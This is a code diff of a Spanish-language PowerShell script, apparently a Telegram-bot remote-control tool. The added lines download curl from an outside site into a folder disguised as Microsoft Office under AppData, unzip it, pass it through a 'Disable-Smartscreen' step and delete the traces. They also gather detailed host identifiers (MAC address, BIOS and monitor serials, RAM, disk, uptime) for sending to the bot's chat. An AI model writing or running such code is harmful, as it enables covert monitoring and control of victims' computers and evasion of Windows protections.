@@ -8,13 +8,16 @@ function bot-send {
 param ($photo,$file,$botkey,$chat_id)
 
 $ruta = $env:USERPROFILE + "\appdata\local\Microsoft\Office"
+$curl_zip = $ruta + "\curl_752_1.zip"
 $curl = $ruta + "\" + "curl.exe"
 $curl_mod = $ruta + "\" + "curl_mod.exe"
 if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
-if ( (Test-Path $curl) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("https://github.com/cybervaca/psbotelegram/raw/master/curl.exe","$curl")
+if ( (Test-Path $curl_mod) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("http://www.paehl.com/open_source/?download=curl_752_1_ssl.zip","$curl_zip")
+[System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null
+[System.IO.Compression.ZipFile]::ExtractToDirectory("$curl_zip","$ruta") | Out-Null
 
 Disable-Smartscreen -File $curl -Output $curl_mod
-Remove-Item $curl
+Remove-Item $curl ; Remove-Item $curl_zip
 }
 
 if ($file -ne $null) {
@@ -47,7 +50,18 @@ $NoOfProcessors=$sheetS.numberofProcessors
 $name=$SheetPU|select name -First 1
 $Manufacturer=$sheetS.Manufacturer
 $Model=$sheetS.Model
-
+$ProcessorName=$SheetPU|select name -First 1
+$Mac = (Get-WmiObject -class Win32_NetworkAdapter -ComputerName $env:COMPUTERNAME  | ? { $_.PhysicalAdapter } ).macaddress
+$date = Get-Date
+$uptime = $OS.ConvertToDateTime($OS.lastbootuptime)
+$sheetPUInfo = $name.Name + " & has " + $sheetPU.NumberOfCores + " Cores & the FSB is " + $sheetPU.ExtClock + " Mhz"
+$sheetPULOAD = $sheetPU.LoadPercentage
+$serialnumer = (Get-WmiObject -Class Win32_BIOS -ComputerName $env:COMPUTERNAME ).serialnumber
+$RAM = (Get-WmiObject -class Win32_ComputerSystem -ComputerName $env:COMPUTERNAME ).totalphysicalmemory / 1gb
+$ram_round= [math]::Round($ram,0)
+$MonitorModelo = (gwmi WmiMonitorID -ComputerName $env:COMPUTERNAME   -Namespace root\wmi | Select @{n="Model";e={[System.Text.Encoding]::ASCII.GetString($_.UserFriendlyName -ne 00)}}).model
+$MonitorSerial = (gwmi WmiMonitorID -ComputerName $env:COMPUTERNAME  -Namespace root\wmi | Select @{n="Serial";e={[System.Text.Encoding]::ASCII.GetString($_.SerialNumberID -ne 00)}}).serial
+$Disco_duro = $drives.Size / 1gb ; $Disco_duro = [math]::Round($Disco_duro,0) ; $Disco_duro = "$Disco_duro Gb"
 $PC = New-Object psobject -Property @{ 
 "Nombre" = $env:COMPUTERNAME
 "Modelo Monitor" = $MonitorModelo
@@ -63,7 +77,6 @@ $PC = New-Object psobject -Property @{
 "Numero de serie" = $serialnumer
 "Disco Duro" = $Disco_duro
 }
-
 $PC | select-Object Nombre, "Modelo Monitor", "Monitor Num. Serie", "Sistema Operativo", "Procesador", "Fabricante", "Modelo", "Num. Procesadores", "Memoria RAM", "Disco Duro", "Direccion IP", "MAC", "Numero de Serie" 
 }
 function public-ip {param ($botkey)
